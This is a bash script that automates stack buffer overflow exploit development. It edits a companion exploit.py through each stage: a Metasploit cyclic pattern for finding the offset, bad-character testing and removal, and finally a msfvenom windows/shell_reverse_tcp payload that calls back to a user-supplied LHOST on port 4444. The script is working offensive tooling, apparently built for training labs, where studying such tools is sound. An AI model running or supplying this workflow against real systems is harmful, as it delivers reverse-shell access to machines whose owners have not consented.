#!/bin/bash

echo 'Rule: Provide empty inputs to generate a full characterset payload.'
echo 'Rule: Provide pattern length only as input to generate the pattern.'
echo 'Rule: Put exploit.py and badcharset.py on the same path as this file.'
read -a plength -p 'Specify (pattern length + 400) (from fuzzer.py): '
read -a badchars -p 'Specify outlying bad characters (from mona): ' 
read -a lhost -p 'Specify lhost (for venom): '

sed -i "/payload =/d" exploit.py #deletes payload variables from exploit.py for reuse
sed -i "/payload +=/d" exploit.py #deletes payload variables from exploit.py for reuse
sed -i "/padding = \"\"/a payload = \"\"" exploit.py #appends payload variable

if [ -n "$plength" ]
then
msfpattern=$(msf-pattern_create -l $plength)
echo '[+] Modifying exploit.py payload with msf-pattern...'
cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
sed -i "/payload = \"\"/c payload = \"$msfpattern\"" exploit.py
echo '[+] Pattern payload: '
echo $msfpattern
exit 0
fi

if [ -z "$badchars" ]
then
echo "[+] Full bad characterset payload: "
echo "payload = \"$(python2 badcharset.py)\""

echo "[+] Modifying exploit.py payload with full characterset..."
cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
replacement=$(echo -E "payload = \"$(python2 badcharset.py)\"" | gawk '/\\/{gsub(/\\/, "\\\\")};{print}' ) 
sed -i "/payload = \"\"/c $replacement" exploit.py
exit 0
fi

if [ -n "$badchars" ] && [ -z "$lhost" ]
then
echo -n "[+] Bad character shellcode: "
bc="$(echo ${badchars[@]} | sed 's/ /\\x/g' | sed 's/^/\\x/g' | tr '' '\n')"
echo "$bc"

echo "[+] Bad character deduction: "
pattern=$(for i in ${badchars[@]}; do echo -n "s+x$i\\\++g; " ; done)
badcharsreplacement=$(echo -E "payload = \"$(python2 badcharset.py)\"" | sed "$pattern" | gawk '/\\/{gsub(/\\/, "\\\\")};{print}')
echo $badcharsreplacement

echo "[+] Modifying exploit.py payload with characterset without bad characters..."
cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
sed -i "/payload = \"\"/c $badcharsreplacement" exploit.py
exit 0
fi

if [ -n "$lhost" ]
then
echo -n '[+] Generating venom...'

cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
bc="$(echo ${badchars[@]} | sed 's/ /\\x/g' | sed 's/^/\\x/g' | tr '' '\n')"
msfoutput=$(msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 EXITFUNC=thread  -v payload -b "$bc" -f python)
venom=$(echo -n -E $msfoutput | gawk '/\\/{gsub(/\\/, "\\\\")};{print}' | sed 's/payload/\\\npayload/g')

echo '[+] Modifying exploit.py with payload...'
sed -i -e "/payload = \"\"/c $venom" exploit.py

echo -n '[+] Generated venom output: '
echo "$(echo $msfoutput | sed 's/payload/\npayload/g')"
exit 0
fi